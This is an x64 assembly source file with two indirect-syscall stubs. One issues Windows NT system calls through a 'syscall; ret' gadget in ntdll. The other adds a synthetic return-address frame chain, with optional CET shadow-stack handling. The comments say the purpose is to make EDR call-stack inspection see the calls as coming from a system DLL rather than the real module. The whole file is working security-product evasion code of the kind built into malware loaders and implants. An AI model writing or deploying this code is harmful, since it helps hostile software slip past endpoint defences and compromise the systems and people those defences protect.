.CODE

; ==============================================================================
; DoSyscall - Indirect Syscall Stub
; ==============================================================================
; Calling convention (custom):
;   RCX = SyscallNumber (SSN)
;   RDX = Trampoline address (points to "syscall; ret" in ntdll .text)
;   R8  = 1st actual NT syscall argument
;   R9  = 2nd actual NT syscall argument
;   [RSP+28h] = 3rd NT arg
;   [RSP+30h] = 4th NT arg
;   ... etc
;
; This stub:
;   1. Saves SSN and trampoline to scratch registers
;   2. Shifts all arguments left by 2 positions (removing our params)
;   3. Sets EAX = SSN, R10 = RCX (NT convention)
;   4. JMPs to the trampoline (syscall; ret executes, ret returns to caller)
;
; The return address on the stack points back to our caller, but the
; syscall instruction executes from inside ntdll .text — this is what
; EDR call stack analysis sees.
; ==============================================================================

DoSyscall PROC
    ; Save non-volatile registers
    push rbp
    push rbx

    ; Save our custom parameters to non-volatile/scratch registers
    mov r10, rcx                        ; R10 = syscall number (temp)
    mov r11, rdx                        ; R11 = trampoline address (temp)

    ; Allocate local frame: 0x80 bytes (16-byte aligned with 2 pushes)
    sub rsp, 80h

    ; Place epilogue return address at [rsp] — consumed by trampoline's ret
    lea rax, [_dosyscall_epilogue]
    mov qword ptr [rsp], rax

    ; Shift actual NT arguments into position
    ; Stack math: 2 pushes (0x10) + sub 0x80 = 0x90 below entry RSP
    ; Entry [RSP+28h] = current [RSP + 0xB8]
    mov rcx, r8                         ; RCX = arg1 (was R8)
    mov rdx, r9                         ; RDX = arg2 (was R9)
    mov r8,  qword ptr [rsp + 0B8h]     ; R8  = arg3
    mov r9,  qword ptr [rsp + 0C0h]     ; R9  = arg4

    ; Copy remaining stack args into our frame (reads from caller, writes to ours)
    mov rax, qword ptr [rsp + 0C8h]
    mov qword ptr [rsp + 28h], rax      ; arg5
    mov rax, qword ptr [rsp + 0D0h]
    mov qword ptr [rsp + 30h], rax      ; arg6
    mov rax, qword ptr [rsp + 0D8h]
    mov qword ptr [rsp + 38h], rax      ; arg7
    mov rax, qword ptr [rsp + 0E0h]
    mov qword ptr [rsp + 40h], rax      ; arg8
    mov rax, qword ptr [rsp + 0E8h]
    mov qword ptr [rsp + 48h], rax      ; arg9
    mov rax, qword ptr [rsp + 0F0h]
    mov qword ptr [rsp + 50h], rax      ; arg10
    mov rax, qword ptr [rsp + 0F8h]
    mov qword ptr [rsp + 58h], rax      ; arg11

    ; Set up final syscall registers
    mov eax, r10d                       ; EAX = SSN (syscall number)
    mov r10, rcx                        ; R10 = RCX (NT calling convention)

    ; Jump to trampoline — "syscall; ret" in ntdll .text
    ; The ret pops our epilogue address from [rsp]
    jmp r11

_dosyscall_epilogue:
    add rsp, 78h                        ; 0x80 - 8 (ret consumed 8 bytes)
    pop rbx
    pop rbp
    ret
DoSyscall ENDP

; ==============================================================================
; DoSyscallSpoofed - Indirect Syscall with Synthetic RBP Frame
; ==============================================================================
; Same calling convention as DoSyscall, but builds a fake RBP chain
; using g_spoof_ret (legitimate return address) and optionally
; g_proxy_frame (for CET shadow stack synchronization).
;
; The synthetic frame makes EDR stack walkers see a plausible call chain
; originating from a system DLL instead of our module.
; ==============================================================================

EXTERN g_spoof_ret:QWORD
EXTERN g_proxy_frame:QWORD

DoSyscallSpoofed PROC
    ; Save all non-volatile registers we touch
    push rbp
    push rbx
    push rsi
    push rdi
    push r12

    ; Save our custom parameters
    mov rsi, rcx                        ; RSI = syscall number
    mov rbx, rdx                        ; RBX = trampoline address

    ; Reserve local frame (0x90 keeps 16-byte alignment with 5 pushes)
    sub rsp, 90h

    ; Place epilogue return address at [rsp] — consumed by trampoline's ret
    lea rdi, [_spoofed_epilogue]
    mov qword ptr [rsp], rdi

    ; Check if spoofing is active
    mov rax, qword ptr [g_spoof_ret]
    test rax, rax
    jz _no_spoof

    ; Check if CET proxy frame is active
    mov r12, qword ptr [g_proxy_frame]
    test r12, r12
    jnz _sdie_proxy

    ; Build standard synthetic RBP frame (CET OFF)
    mov qword ptr [rsp + 08h], 0        ; Terminate RBP chain
    mov qword ptr [rsp + 10h], rax      ; Legitimate return address
    lea rbp, [rsp + 08h]
    jmp _do_call

_sdie_proxy:
    ; CET mode: push proxy frame for shadow stack synchronization
    mov qword ptr [rsp + 08h], r12      ; Proxy frame address
    mov qword ptr [rsp + 10h], rax      ; Legitimate return address
    lea rbp, [rsp + 10h]
    jmp _do_call

_no_spoof:
    ; No spoofing — just set up a normal frame
    lea rbp, [rsp + 08h]

_do_call:
    ; Shift arguments into NT convention
    ; Stack math: 5 pushes (0x28) + sub 0x90 = 0xB8 below entry RSP
    ; Entry RSP + 0x28 (5th arg) = current RSP + 0xE0
    mov rcx, r8
    mov rdx, r9
    mov r8,  qword ptr [rsp + 0E0h]
    mov r9,  qword ptr [rsp + 0E8h]

    ; Shift remaining stack args
    mov rax, qword ptr [rsp + 0F0h]
    mov qword ptr [rsp + 28h], rax
    mov rax, qword ptr [rsp + 0F8h]
    mov qword ptr [rsp + 30h], rax
    mov rax, qword ptr [rsp + 100h]
    mov qword ptr [rsp + 38h], rax
    mov rax, qword ptr [rsp + 108h]
    mov qword ptr [rsp + 40h], rax
    mov rax, qword ptr [rsp + 110h]
    mov qword ptr [rsp + 48h], rax
    mov rax, qword ptr [rsp + 118h]
    mov qword ptr [rsp + 50h], rax
    mov rax, qword ptr [rsp + 120h]
    mov qword ptr [rsp + 58h], rax

    ; Final syscall setup
    mov eax, esi                        ; EAX = SSN
    mov r10, rcx                        ; R10 = RCX (NT convention)
    mov r11, rbx                        ; R11 = trampoline

    ; Jump to trampoline — syscall;ret executes, ret pops our epilogue addr
    jmp r11

_spoofed_epilogue:
    ; Trampoline's ret consumed 8 bytes from [rsp], so 0x90 - 0x8 = 0x88 remains
    add rsp, 88h
    pop r12
    pop rdi
    pop rsi
    pop rbx
    pop rbp
    ret
DoSyscallSpoofed ENDP

END
